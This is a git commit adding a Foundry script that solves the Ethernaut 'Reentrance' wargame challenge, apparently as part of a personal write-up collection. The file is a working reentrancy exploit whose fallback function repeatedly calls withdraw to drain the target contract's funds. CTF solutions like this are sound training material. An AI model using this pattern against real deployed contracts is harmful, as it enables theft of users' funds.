d62ca573f1c99d068ba54e4bd7c2e86a9d39f9f2
Sandy Sung <weichihsung@icloud.com>
2024-09-03 21:47:59 +0800

    Create Reentrance.s.sol

---
+++ Writeup/Sandy/Ethernaut/Reentrance.s.sol
@@ -0,0 +1,42 @@
+pragma solidity ^0.6.12;
+
+import {Script, console} from "forge-std/Script.sol";
+import {Reentrance} from "../../src/Ethernaut/Reentrance.sol";
+
+contract ExploitScript is Script {
+    function run() public {
+        vm.startBroadcast();
+        Reentrance reentrance = new Reentrance();
+        Attack attack = new Attack(payable(address(reentrance)));
+        attack.setup();
+        vm.stopBroadcast();
+    }
+}
+
+interface IReentrancy {
+    function donate(address _to) external payable;
+    function withdraw(uint256 _amount) external;
+    function balanceOf(address _who) external view returns (uint256 balance);
+}
+
+contract Attack {
+    address payable addr;
+
+    constructor(address payable _instanceAddr) public payable {
+        addr = _instanceAddr;
+    }
+
+    uint256 public balance;
+
+    function setup() public payable {
+        IReentrancy(addr).donate{value: msg.value}(address(this));
+        IReentrancy(addr).withdraw(msg.value);
+    }
+
+    fallback() external payable {
+        balance = IReentrancy(addr).balanceOf(address(this));
+        if (balance > 0) {
+            IReentrancy(addr).withdraw(balance);
+        }
+    }
+}
